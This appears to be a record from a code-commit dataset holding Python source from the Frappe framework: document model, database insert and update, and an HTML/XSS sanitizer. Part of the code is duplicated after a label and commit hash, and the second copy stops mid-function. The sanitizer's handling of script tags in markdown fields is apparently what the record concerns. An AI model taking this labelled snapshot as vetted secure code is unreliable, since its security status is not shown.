		if not frappe.db.exists(""Module Def"", doc.module):
			m = frappe.get_doc({""doctype"": ""Module Def"", ""module_name"": doc.module})
			m.app_name = frappe.local.module_app[frappe.scrub(doc.module)]
			m.flags.ignore_mandatory = m.flags.ignore_permissions = True
			m.insert()

		default_roles = [""Administrator"", ""Guest"", ""All""]
		roles = [p.role for p in doc.get(""permissions"") or []] + default_roles

		for role in list(set(roles)):
			if not frappe.db.exists(""Role"", role):
				r = frappe.get_doc(dict(doctype= ""Role"", role_name=role, desk_access=1))
				r.flags.ignore_mandatory = r.flags.ignore_permissions = True
				r.insert()
	except frappe.DoesNotExistError as e:
		pass
	except frappe.SQLError as e:
		if e.args[0]==1146:
			pass
		else:
			raise

def init_list(doctype):
	""""""Make boilerplate list views.""""""
	doc = frappe.get_meta(doctype)
	make_boilerplate(""controller_list.js"", doc)
	make_boilerplate(""controller_list.html"", doc)

def check_if_fieldname_conflicts_with_methods(doctype, fieldname):
	doc = frappe.get_doc({""doctype"": doctype})
	method_list = [method for method in dir(doc) if isinstance(method, str) and callable(getattr(doc, method))]

	if fieldname in method_list:
		frappe.throw(_(""Fieldname {0} conflicting with meta object"").format(fieldname))

def clear_linked_doctype_cache():
	frappe.cache().delete_value('linked_doctypes_without_ignore_user_permissions_enabled')
/n/n/nfrappe/model/base_document.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
from six import iteritems, string_types
import datetime
import frappe, sys
from frappe import _
from frappe.utils import (cint, flt, now, cstr, strip_html,
	sanitize_html, sanitize_email, cast_fieldtype)
from frappe.model import default_fields
from frappe.model.naming import set_new_name
from frappe.model.utils.link_count import notify_link_count
from frappe.modules import load_doctype_module
from frappe.model import display_fieldtypes
from frappe.model.db_schema import type_map, varchar_len
from frappe.utils.password import get_decrypted_password, set_encrypted_password

_classes = {}

def get_controller(doctype):
	""""""Returns the **class** object of the given DocType.
	For `custom` type, returns `frappe.model.document.Document`.

	:param doctype: DocType name as string.""""""
	from frappe.model.document import Document
	global _classes

	if not doctype in _classes:
		module_name, custom = frappe.db.get_value(""DocType"", doctype, (""module"", ""custom""), cache=True) \
			or [""Core"", False]

		if custom:
			_class = Document
		else:
			module = load_doctype_module(doctype, module_name)
			classname = doctype.replace("" "", """").replace(""-"", """")
			if hasattr(module, classname):
				_class = getattr(module, classname)
				if issubclass(_class, BaseDocument):
					_class = getattr(module, classname)
				else:
					raise ImportError(doctype)
			else:
				raise ImportError(doctype)
		_classes[doctype] = _class

	return _classes[doctype]

class BaseDocument(object):
	ignore_in_getter = (""doctype"", ""_meta"", ""meta"", ""_table_fields"", ""_valid_columns"")

	def __init__(self, d):
		self.update(d)
		self.dont_update_if_missing = []

		if hasattr(self, ""__setup__""):
			self.__setup__()

	@property
	def meta(self):
		if not hasattr(self, ""_meta""):
			self._meta = frappe.get_meta(self.doctype)

		return self._meta

	def update(self, d):
		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))

		# first set default field values of base document
		for key in default_fields:
			if key in d:
				self.set(key, d.get(key))

		for key, value in iteritems(d):
			self.set(key, value)

		return self

	def update_if_missing(self, d):
		if isinstance(d, BaseDocument):
			d = d.get_valid_dict()

		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))
		for key, value in iteritems(d):
			# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value
			if (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):
				self.set(key, value)

	def get_db_value(self, key):
		return frappe.db.get_value(self.doctype, self.name, key)

	def get(self, key=None, filters=None, limit=None, default=None):
		if key:
			if isinstance(key, dict):
				return _filter(self.get_all_children(), key, limit=limit)
			if filters:
				if isinstance(filters, dict):
					value = _filter(self.__dict__.get(key, []), filters, limit=limit)
				else:
					default = filters
					filters = None
					value = self.__dict__.get(key, default)
			else:
				value = self.__dict__.get(key, default)

			if value is None and key not in self.ignore_in_getter \
				and key in (d.fieldname for d in self.meta.get_table_fields()):
				self.set(key, [])
				value = self.__dict__.get(key)

			return value
		else:
			return self.__dict__

	def getone(self, key, filters=None):
		return self.get(key, filters=filters, limit=1)[0]

	def set(self, key, value, as_value=False):
		if isinstance(value, list) and not as_value:
			self.__dict__[key] = []
			self.extend(key, value)
		else:
			self.__dict__[key] = value

	def delete_key(self, key):
		if key in self.__dict__:
			del self.__dict__[key]

	def append(self, key, value=None):
		if value==None:
			value={}
		if isinstance(value, (dict, BaseDocument)):
			if not self.__dict__.get(key):
				self.__dict__[key] = []
			value = self._init_child(value, key)
			self.__dict__[key].append(value)

			# reference parent document
			value.parent_doc = self

			return value
		else:

			# metaclasses may have arbitrary lists
			# which we can ignore
			if (getattr(self, '_metaclass', None)
				or self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):
				return value

			raise ValueError(
				'Document for field ""{0}"" attached to child table of ""{1}"" must be a dict or BaseDocument, not {2} ({3})'.format(key,
					self.name, str(type(value))[1:-1], value)
			)

	def extend(self, key, value):
		if isinstance(value, list):
			for v in value:
				self.append(key, v)
		else:
			raise ValueError

	def remove(self, doc):
		self.get(doc.parentfield).remove(doc)

	def _init_child(self, value, key):
		if not self.doctype:
			return value
		if not isinstance(value, BaseDocument):
			if ""doctype"" not in value:
				value[""doctype""] = self.get_table_field_doctype(key)
				if not value[""doctype""]:
					raise AttributeError(key)
			value = get_controller(value[""doctype""])(value)
			value.init_valid_columns()

		value.parent = self.name
		value.parenttype = self.doctype
		value.parentfield = key

		if value.docstatus is None:
			value.docstatus = 0

		if not getattr(value, ""idx"", None):
			value.idx = len(self.get(key) or []) + 1

		if not getattr(value, ""name"", None):
			value.__dict__['__islocal'] = 1

		return value

	def get_valid_dict(self, sanitize=True, convert_dates_to_str=False):
		d = frappe._dict()
		for fieldname in self.meta.get_valid_columns():
			d[fieldname] = self.get(fieldname)

			# if no need for sanitization and value is None, continue
			if not sanitize and d[fieldname] is None:
				continue

			df = self.meta.get_field(fieldname)
			if df:
				if df.fieldtype==""Check"":
					if d[fieldname]==None:
						d[fieldname] = 0

					elif (not isinstance(d[fieldname], int) or d[fieldname] > 1):
						d[fieldname] = 1 if cint(d[fieldname]) else 0

				elif df.fieldtype==""Int"" and not isinstance(d[fieldname], int):
					d[fieldname] = cint(d[fieldname])

				elif df.fieldtype in (""Currency"", ""Float"", ""Percent"") and not isinstance(d[fieldname], float):
					d[fieldname] = flt(d[fieldname])

				elif df.fieldtype in (""Datetime"", ""Date"", ""Time"") and d[fieldname]=="""":
					d[fieldname] = None

				elif df.get(""unique"") and cstr(d[fieldname]).strip()=="""":
					# unique empty field should be set to None
					d[fieldname] = None

				if isinstance(d[fieldname], list) and df.fieldtype != 'Table':
					frappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))

				if convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):
					d[fieldname] = str(d[fieldname])

		return d

	def init_valid_columns(self):
		for key in default_fields:
			if key not in self.__dict__:
				self.__dict__[key] = None

			if key in (""idx"", ""docstatus"") and self.__dict__[key] is None:
				self.__dict__[key] = 0

		for key in self.get_valid_columns():
			if key not in self.__dict__:
				self.__dict__[key] = None

	def get_valid_columns(self):
		if self.doctype not in frappe.local.valid_columns:
			if self.doctype in (""DocField"", ""DocPerm"") and self.parent in (""DocType"", ""DocField"", ""DocPerm""):
				from frappe.model.meta import get_table_columns
				valid = get_table_columns(self.doctype)
			else:
				valid = self.meta.get_valid_columns()

			frappe.local.valid_columns[self.doctype] = valid

		return frappe.local.valid_columns[self.doctype]

	def is_new(self):
		return self.get(""__islocal"")

	def as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):
		doc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)
		doc[""doctype""] = self.doctype
		for df in self.meta.get_table_fields():
			children = self.get(df.fieldname) or []
			doc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]

		if no_nulls:
			for k in list(doc):
				if doc[k] is None:
					del doc[k]

		if no_default_fields:
			for k in list(doc):
				if k in default_fields:
					del doc[k]

		for key in (""_user_tags"", ""__islocal"", ""__onload"", ""_liked_by"", ""__run_link_triggers""):
			if self.get(key):
				doc[key] = self.get(key)

		return doc

	def as_json(self):
		return frappe.as_json(self.as_dict())

	def get_table_field_doctype(self, fieldname):
		return self.meta.get_field(fieldname).options

	def get_parentfield_of_doctype(self, doctype):
		fieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]
		return fieldname[0] if fieldname else None

	def db_insert(self):
		""""""INSERT the document (with valid columns) in the database.""""""
		if not self.name:
			# name will be set by document class in most cases
			set_new_name(self)

		if not self.creation:
			self.creation = self.modified = now()
			self.created_by = self.modifield_by = frappe.session.user

		d = self.get_valid_dict(convert_dates_to_str=True)

		columns = list(d)
		try:
			frappe.db.sql(""""""insert into `tab{doctype}`
				({columns}) values ({values})"""""".format(
					doctype = self.doctype,
					columns = "", "".join([""`""+c+""`"" for c in columns]),
					values = "", "".join([""%s""] * len(columns))
				), list(d.values()))
		except Exception as e:
			if e.args[0]==1062:
				if ""PRIMARY"" in cstr(e.args[1]):
					if self.meta.autoname==""hash"":
						# hash collision? try again
						self.name = None
						self.db_insert()
						return

					raise frappe.DuplicateEntryError(self.doctype, self.name, e)

				elif ""Duplicate"" in cstr(e.args[1]):
					# unique constraint
					self.show_unique_validation_message(e)
				else:
					raise
			else:
				raise
		self.set(""__islocal"", False)

	def db_update(self):
		if self.get(""__islocal"") or not self.name:
			self.db_insert()
			return

		d = self.get_valid_dict(convert_dates_to_str=True)

		# don't update name, as case might've been changed
		name = d['name']
		del d['name']

		columns = list(d)

		try:
			frappe.db.sql(""""""update `tab{doctype}`
				set {values} where name=%s"""""".format(
					doctype = self.doctype,
					values = "", "".join([""`""+c+""`=%s"" for c in columns])
				), list(d.values()) + [name])
		except Exception as e:
			if e.args[0]==1062 and ""Duplicate"" in cstr(e.args[1]):
				self.show_unique_validation_message(e)
			else:
				raise

	def show_unique_validation_message(self, e):
		type, value, traceback = sys.exc_info()
		fieldname, label = str(e).split(""'"")[-2], None

		# unique_first_fieldname_second_fieldname is the constraint name
		# created using frappe.db.add_unique
		if ""unique_"" in fieldname:
			fieldname = fieldname.split(""_"", 1)[1]

		df = self.meta.get_field(fieldname)
		if df:
			label = df.label

		frappe.msgprint(_(""{0} must be unique"".format(label or fieldname)))

		# this is used to preserve traceback
		raise frappe.UniqueValidationError(self.doctype, self.name, e)

	def update_modified(self):
		'''Update modified timestamp'''
		self.set(""modified"", now())
		frappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)

	def _fix_numeric_types(self):
		for df in self.meta.get(""fields""):
			if df.fieldtype == ""Check"":
				self.set(df.fieldname, cint(self.get(df.fieldname)))

			elif self.get(df.fieldname) is not None:
				if df.fieldtype == ""Int"":
					self.set(df.fieldname, cint(self.get(df.fieldname)))

				elif df.fieldtype in (""Float"", ""Currency"", ""Percent""):
					self.set(df.fieldname, flt(self.get(df.fieldname)))

		if self.docstatus is not None:
			self.docstatus = cint(self.docstatus)

	def _get_missing_mandatory_fields(self):
		""""""Get mandatory fields that do not have any values""""""
		def get_msg(df):
			if df.fieldtype == ""Table"":
				return ""{}: {}: {}"".format(_(""Error""), _(""Data missing in table""), _(df.label))

			elif self.parentfield:
				return ""{}: {} {} #{}: {}: {}"".format(_(""Error""), frappe.bold(_(self.doctype)),
					_(""Row""), self.idx, _(""Value missing for""), _(df.label))

			else:
				return _(""Error: Value missing for {0}: {1}"").format(_(df.parent), _(df.label))

		missing = []

		for df in self.meta.get(""fields"", {""reqd"": ('=', 1)}):
			if self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():
				missing.append((df.fieldname, get_msg(df)))

		# check for missing parent and parenttype
		if self.meta.istable:
			for fieldname in (""parent"", ""parenttype""):
				if not self.get(fieldname):
					missing.append((fieldname, get_msg(frappe._dict(label=fieldname))))

		return missing

	def get_invalid_links(self, is_submittable=False):
		'''Returns list of invalid links and also updates fetch values if not set'''
		def get_msg(df, docname):
			if self.parentfield:
				return ""{} #{}: {}: {}"".format(_(""Row""), self.idx, _(df.label), docname)
			else:
				return ""{}: {}"".format(_(df.label), docname)

		invalid_links = []
		cancelled_links = []

		for df in (self.meta.get_link_fields()
				+ self.meta.get(""fields"", {""fieldtype"": ('=', ""Dynamic Link"")})):
			docname = self.get(df.fieldname)

			if docname:
				if df.fieldtype==""Link"":
					doctype = df.options
					if not doctype:
						frappe.throw(_(""Options not set for link field {0}"").format(df.fieldname))
				else:
					doctype = self.get(df.options)
					if not doctype:
						frappe.throw(_(""{0} must be set first"").format(self.meta.get_label(df.options)))

				# MySQL is case insensitive. Preserve case of the original docname in the Link Field.

				# get a map of values ot fetch along with this link query
				# that are mapped as link_fieldname.source_fieldname in Options of
				# Readonly or Data or Text type fields

				fields_to_fetch = [
					_df for _df in self.meta.get_fields_to_fetch(df.fieldname)
					if
						not _df.get('fetch_if_empty')
						or (_df.get('fetch_if_empty') and not self.get(_df.fieldname))
				]

				if not fields_to_fetch:
					# cache a single value type
					values = frappe._dict(name=frappe.db.get_value(doctype, docname,
						'name', cache=True))
				else:
					values_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]
						for _df in fields_to_fetch]

					# don't cache if fetching other values too
					values = frappe.db.get_value(doctype, docname,
						values_to_fetch, as_dict=True)

				if frappe.get_meta(doctype).issingle:
					values.name = doctype

				if values:
					setattr(self, df.fieldname, values.name)

					for _df in fields_to_fetch:
						if self.is_new() or self.docstatus != 1 or _df.allow_on_submit:
							setattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])

					notify_link_count(doctype, docname)

					if not values.name:
						invalid_links.append((df.fieldname, docname, get_msg(df, docname)))

					elif (df.fieldname != ""amended_from""
						and (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable
						and cint(frappe.db.get_value(doctype, docname, ""docstatus""))==2):

						cancelled_links.append((df.fieldname, docname, get_msg(df, docname)))

		return invalid_links, cancelled_links

	def _validate_selects(self):
		if frappe.flags.in_import:
			return

		for df in self.meta.get_select_fields():
			if df.fieldname==""naming_series"" or not (self.get(df.fieldname) and df.options):
				continue

			options = (df.options or """").split(""\n"")

			# if only empty options
			if not filter(None, options):
				continue

			# strip and set
			self.set(df.fieldname, cstr(self.get(df.fieldname)).strip())
			value = self.get(df.fieldname)

			if value not in options and not (frappe.flags.in_test and value.startswith(""_T-"")):
				# show an elaborate message
				prefix = _(""Row #{0}:"").format(self.idx) if self.get(""parentfield"") else """"
				label = _(self.meta.get_label(df.fieldname))
				comma_options = '"", ""'.join(_(each) for each in options)

				frappe.throw(_('{0} {1} cannot be ""{2}"". It should be one of ""{3}""').format(prefix, label,
					value, comma_options))

	def _validate_constants(self):
		if frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:
			return

		constants = [d.fieldname for d in self.meta.get(""fields"", {""set_only_once"": ('=',1)})]
		if constants:
			values = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)

		for fieldname in constants:
			df = self.meta.get_field(fieldname)

			# This conversion to string only when fieldtype is Date
			if df.fieldtype == 'Date' or df.fieldtype == 'Datetime':
				value = str(values.get(fieldname))

			else:
				value  = values.get(fieldname)

			if self.get(fieldname) != value:
				frappe.throw(_(""Value cannot be changed for {0}"").format(self.meta.get_label(fieldname)),
					frappe.CannotChangeConstantError)

	def _validate_length(self):
		if frappe.flags.in_install:
			return

		if self.meta.issingle:
			# single doctype value type is mediumtext
			return

		column_types_to_check_length = ('varchar', 'int', 'bigint')

		for fieldname, value in iteritems(self.get_valid_dict()):
			df = self.meta.get_field(fieldname)

			if not df or df.fieldtype == 'Check':
				# skip standard fields and Check fields
				continue

			column_type = type_map[df.fieldtype][0] or None
			default_column_max_length = type_map[df.fieldtype][1] or None

			if df and df.fieldtype in type_map and column_type in column_types_to_check_length:
				max_length = cint(df.get(""length"")) or cint(default_column_max_length)

				if len(cstr(value)) > max_length:
					if self.parentfield and self.idx:
						reference = _(""{0}, Row {1}"").format(_(self.doctype), self.idx)

					else:
						reference = ""{0} {1}"".format(_(self.doctype), self.name)

					frappe.throw(_(""{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}"")\
						.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))

	def _validate_update_after_submit(self):
		# get the full doc with children
		db_values = frappe.get_doc(self.doctype, self.name).as_dict()

		for key in self.as_dict():
			df = self.meta.get_field(key)
			db_value = db_values.get(key)

			if df and not df.allow_on_submit and (self.get(key) or db_value):
				if df.fieldtype==""Table"":
					# just check if the table size has changed
					# individual fields will be checked in the loop for children
					self_value = len(self.get(key))
					db_value = len(db_value)

				else:
					self_value = self.get_value(key)

				if self_value != db_value:
					frappe.throw(_(""Not allowed to change {0} after submission"").format(df.label),
						frappe.UpdateAfterSubmitError)

	def _sanitize_content(self):
		""""""Sanitize HTML and Email in field values. Used to prevent XSS.

			- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'
		""""""
		if frappe.flags.in_install:
			return

		for fieldname, value in self.get_valid_dict().items():
			if not value or not isinstance(value, string_types):
				continue

			value = frappe.as_unicode(value)

			if (u""<"" not in value and u"">"" not in value):
				# doesn't look like html so no need
				continue

			elif ""<!-- markdown -->"" in value and not (""<script"" in value or ""javascript:"" in value):
				# should be handled separately via the markdown converter function
				continue

			df = self.meta.get_field(fieldname)
			sanitized_value = value

			if df and df.get(""fieldtype"") in (""Data"", ""Code"", ""Small Text"") and df.get(""options"")==""Email"":
				sanitized_value = sanitize_email(value)

			elif df and (df.get(""ignore_xss_filter"")
						or (df.get(""fieldtype"")==""Code"" and df.get(""options"")!=""Email"")
						or df.get(""fieldtype"") in (""Attach"", ""Attach Image"", ""Barcode"")

						# cancelled and submit but not update after submit should be ignored
						or self.docstatus==2
						or (self.docstatus==1 and not df.get(""allow_on_submit""))):
				continue

			else:
				sanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')

			self.set(fieldname, sanitized_value)

	def _save_passwords(self):
		'''Save password field values in __Auth table'''
		if self.flags.ignore_save_passwords is True:
			return

		for df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):
			if self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue
			new_password = self.get(df.fieldname)
			if new_password and not self.is_dummy_password(new_password):
				# is not a dummy password like '*****'
				set_encrypted_password(self.doctype, self.name, new_password, df.fieldname)

				# set dummy password like '*****'
				self.set(df.fieldname, '*'*len(new_password))

	def get_password(self, fieldname='password', raise_exception=True):
		if self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):
			return self.get(fieldname)

		return get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)

	def is_dummy_password(self, pwd):
		return ''.join(set(pwd))=='*'

	def precision(self, fieldname, parentfield=None):
		""""""Returns float precision for a particular field (or get global default).

		:param fieldname: Fieldname for which precision is required.
		:param parentfield: If fieldname is in child table.""""""
		from frappe.model.meta import get_field_precision

		if parentfield and not isinstance(parentfield, string_types):
			parentfield = parentfield.parentfield

		cache_key = parentfield or ""main""

		if not hasattr(self, ""_precision""):
			self._precision = frappe._dict()

		if cache_key not in self._precision:
			self._precision[cache_key] = frappe._dict()

		if fieldname not in self._precision[cache_key]:
			self._precision[cache_key][fieldname] = None

			doctype = self.meta.get_field(parentfield).options if parentfield else self.doctype
			df = frappe.get_meta(doctype).get_field(fieldname)

			if df.fieldtype in (""Currency"", ""Float"", ""Percent""):
				self._precision[cache_key][fieldname] = get_field_precision(df, self)

		return self._precision[cache_key][fieldname]


	def get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):
		from frappe.utils.formatters import format_value

		df = self.meta.get_field(fieldname)
		if not df and fieldname in default_fields:
			from frappe.model.meta import get_default_df
			df = get_default_df(fieldname)

		val = self.get(fieldname)

		if translated:
			val = _(val)

		if absolute_value and isinstance(val, (int, float)):
			val = abs(self.get(fieldname))

		if not doc:
			doc = getattr(self, ""parent_doc"", None) or self

		return format_value(val, df=df, doc=doc, currency=currency)

	def is_print_hide(self, fieldname, df=None, for_print=True):
		""""""Returns true if fieldname is to be hidden for print.

		Print Hide can be set via the Print Format Builder or in the controller as a list
		of hidden fields. Example

			class MyDoc(Document):
				def __setup__(self):
					self.print_hide = [""field1"", ""field2""]

		:param fieldname: Fieldname to be checked if hidden.
		""""""
		meta_df = self.meta.get_field(fieldname)
		if meta_df and meta_df.get(""__print_hide""):
			return True

		print_hide = 0

		if self.get(fieldname)==0 and not self.meta.istable:
			print_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )

		if not print_hide:
			if df and df.print_hide is not None:
				print_hide = df.print_hide
			elif meta_df:
				print_hide = meta_df.print_hide

		return print_hide

	def in_format_data(self, fieldname):
		""""""Returns True if shown via Print Format::`format_data` property.
			Called from within standard print format.""""""
		doc = getattr(self, ""parent_doc"", self)

		if hasattr(doc, ""format_data_map""):
			return fieldname in doc.format_data_map
		else:
			return True

	def reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):
		""""""If the user does not have permissions at permlevel > 0, then reset the values to original / default""""""
		to_reset = []

		for df in high_permlevel_fields:
			if df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:
				to_reset.append(df)

		if to_reset:
			if self.is_new():
				# if new, set default value
				ref_doc = frappe.new_doc(self.doctype)
			else:
				# get values from old doc
				if self.get('parent_doc'):
					self.parent_doc.get_latest()
					ref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]
				else:
					ref_doc = self.get_latest()

			for df in to_reset:
				self.set(df.fieldname, ref_doc.get(df.fieldname))

	def get_value(self, fieldname):
		df = self.meta.get_field(fieldname)
		val = self.get(fieldname)

		return self.cast(val, df)

	def cast(self, value, df):
		return cast_fieldtype(df.fieldtype, value)

	def _extract_images_from_text_editor(self):
		from frappe.utils.file_manager import extract_images_from_doc
		if self.doctype != ""DocType"":
			for df in self.meta.get(""fields"", {""fieldtype"": ('=', ""Text Editor"")}):
				extract_images_from_doc(self, df.fieldname)

def _filter(data, filters, limit=None):
	""""""pass filters as:
		{""key"": ""val"", ""key"": [""!="", ""val""],
		""key"": [""in"", ""val""], ""key"": [""not in"", ""val""], ""key"": ""^val"",
		""key"" : True (exists), ""key"": False (does not exist) }""""""

	out, _filters = [], {}

	if not data:
		return out

	# setup filters as tuples
	if filters:
		for f in filters:
			fval = filters[f]

			if not isinstance(fval, (tuple, list)):
				if fval is True:
					fval = (""not None"", fval)
				elif fval is False:
					fval = (""None"", fval)
				elif isinstance(fval, string_types) and fval.startswith(""^""):
					fval = (""^"", fval[1:])
				else:
					fval = (""="", fval)

			_filters[f] = fval

	for d in data:
		add = True
		for f, fval in iteritems(_filters):
			if not frappe.compare(getattr(d, f, None), fval[0], fval[1]):
				add = False
				break

		if add:
			out.append(d)
			if limit and (len(out)-1)==limit:
				break

	return out
/n/n/n",0
67,acd2f589b6cd2d1011be4a4e4965a1b3ed489c37,"/frappe/model/base_document.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
from six import iteritems, string_types
import datetime
import frappe, sys
from frappe import _
from frappe.utils import (cint, flt, now, cstr, strip_html,
	sanitize_html, sanitize_email, cast_fieldtype)
from frappe.model import default_fields
from frappe.model.naming import set_new_name
from frappe.model.utils.link_count import notify_link_count
from frappe.modules import load_doctype_module
from frappe.model import display_fieldtypes
from frappe.model.db_schema import type_map, varchar_len
from frappe.utils.password import get_decrypted_password, set_encrypted_password

_classes = {}

def get_controller(doctype):
	""""""Returns the **class** object of the given DocType.
	For `custom` type, returns `frappe.model.document.Document`.

	:param doctype: DocType name as string.""""""
	from frappe.model.document import Document
	global _classes

	if not doctype in _classes:
		module_name, custom = frappe.db.get_value(""DocType"", doctype, (""module"", ""custom""), cache=True) \
			or [""Core"", False]

		if custom:
			_class = Document
		else:
			module = load_doctype_module(doctype, module_name)
			classname = doctype.replace("" "", """").replace(""-"", """")
			if hasattr(module, classname):
				_class = getattr(module, classname)
				if issubclass(_class, BaseDocument):
					_class = getattr(module, classname)
				else:
					raise ImportError(doctype)
			else:
				raise ImportError(doctype)
		_classes[doctype] = _class

	return _classes[doctype]

class BaseDocument(object):
	ignore_in_getter = (""doctype"", ""_meta"", ""meta"", ""_table_fields"", ""_valid_columns"")

	def __init__(self, d):
		self.update(d)
		self.dont_update_if_missing = []

		if hasattr(self, ""__setup__""):
			self.__setup__()

	@property
	def meta(self):
		if not hasattr(self, ""_meta""):
			self._meta = frappe.get_meta(self.doctype)

		return self._meta

	def update(self, d):
		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))

		# first set default field values of base document
		for key in default_fields:
			if key in d:
				self.set(key, d.get(key))

		for key, value in iteritems(d):
			self.set(key, value)

		return self

	def update_if_missing(self, d):
		if isinstance(d, BaseDocument):
			d = d.get_valid_dict()

		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))
		for key, value in iteritems(d):
			# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value
			if (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):
				self.set(key, value)

	def get_db_value(self, key):
		return frappe.db.get_value(self.doctype, self.name, key)

	def get(self, key=None, filters=None, limit=None, default=None):
		if key:
			if isinstance(key, dict):
				return _filter(self.get_all_children(), key, limit=limit)
			if filters:
				if isinstance(filters, dict):
					value = _filter(self.__dict__.get(key, []), filters, limit=limit)
				else:
					default = filters
					filters = None
					value = self.__dict__.get(key, default)
			else:
				value = self.__dict__.get(key, default)

			if value is None and key not in self.ignore_in_getter \
				and key in (d.fieldname for d in self.meta.get_table_fields()):
				self.set(key, [])
				value = self.__dict__.get(key)

			return value
		else:
			return self.__dict__

	def getone(self, key, filters=None):
		return self.get(key, filters=filters, limit=1)[0]

	def set(self, key, value, as_value=False):
		if isinstance(value, list) and not as_value:
			self.__dict__[key] = []
			self.extend(key, value)
		else:
			self.__dict__[key] = value

	def delete_key(self, key):
		if key in self.__dict__:
			del self.__dict__[key]

	def append(self, key, value=None):
		if value==None:
			value={}
		if isinstance(value, (dict, BaseDocument)):
			if not self.__dict__.get(key):
				self.__dict__[key] = []
			value = self._init_child(value, key)
			self.__dict__[key].append(value)

			# reference parent document
			value.parent_doc = self

			return value
		else:

			# metaclasses may have arbitrary lists
			# which we can ignore
			if (getattr(self, '_metaclass', None)
				or self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):
				return value

			raise ValueError(
				'Document for field ""{0}"" attached to child table of ""{1}"" must be a dict or BaseDocument, not {2} ({3})'.format(key,
					self.name, str(type(value))[1:-1], value)
			)

	def extend(self, key, value):
		if isinstance(value, list):
			for v in value:
				self.append(key, v)
		else:
			raise ValueError

	def remove(self, doc):
		self.get(doc.parentfield).remove(doc)

	def _init_child(self, value, key):
		if not self.doctype:
			return value
		if not isinstance(value, BaseDocument):
			if ""doctype"" not in value:
				value[""doctype""] = self.get_table_field_doctype(key)
				if not value[""doctype""]:
					raise AttributeError(key)
			value = get_controller(value[""doctype""])(value)
			value.init_valid_columns()

		value.parent = self.name
		value.parenttype = self.doctype
		value.parentfield = key

		if value.docstatus is None:
			value.docstatus = 0

		if not getattr(value, ""idx"", None):
			value.idx = len(self.get(key) or []) + 1

		if not getattr(value, ""name"", None):
			value.__dict__['__islocal'] = 1

		return value

	def get_valid_dict(self, sanitize=True, convert_dates_to_str=False):
		d = frappe._dict()
		for fieldname in self.meta.get_valid_columns():
			d[fieldname] = self.get(fieldname)

			# if no need for sanitization and value is None, continue
			if not sanitize and d[fieldname] is None:
				continue

			df = self.meta.get_field(fieldname)
			if df:
				if df.fieldtype==""Check"":
					if d[fieldname]==None:
						d[fieldname] = 0

					elif (not isinstance(d[fieldname], int) or d[fieldname] > 1):
						d[fieldname] = 1 if cint(d[fieldname]) else 0

				elif df.fieldtype==""Int"" and not isinstance(d[fieldname], int):
					d[fieldname] = cint(d[fieldname])

				elif df.fieldtype in (""Currency"", ""Float"", ""Percent"") and not isinstance(d[fieldname], float):
					d[fieldname] = flt(d[fieldname])

				elif df.fieldtype in (""Datetime"", ""Date"", ""Time"") and d[fieldname]=="""":
					d[fieldname] = None

				elif df.get(""unique"") and cstr(d[fieldname]).strip()=="""":
					# unique empty field should be set to None
					d[fieldname] = None

				if isinstance(d[fieldname], list) and df.fieldtype != 'Table':
					frappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))

				if convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):
					d[fieldname] = str(d[fieldname])

		return d

	def init_valid_columns(self):
		for key in default_fields:
			if key not in self.__dict__:
				self.__dict__[key] = None

			if key in (""idx"", ""docstatus"") and self.__dict__[key] is None:
				self.__dict__[key] = 0

		for key in self.get_valid_columns():
			if key not in self.__dict__:
				self.__dict__[key] = None

	def get_valid_columns(self):
		if self.doctype not in frappe.local.valid_columns:
			if self.doctype in (""DocField"", ""DocPerm"") and self.parent in (""DocType"", ""DocField"", ""DocPerm""):
				from frappe.model.meta import get_table_columns
				valid = get_table_columns(self.doctype)
			else:
				valid = self.meta.get_valid_columns()

			frappe.local.valid_columns[self.doctype] = valid

		return frappe.local.valid_columns[self.doctype]

	def is_new(self):
		return self.get(""__islocal"")

	def as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):
		doc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)
		doc[""doctype""] = self.doctype
		for df in self.meta.get_table_fields():
			children = self.get(df.fieldname) or []
			doc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]

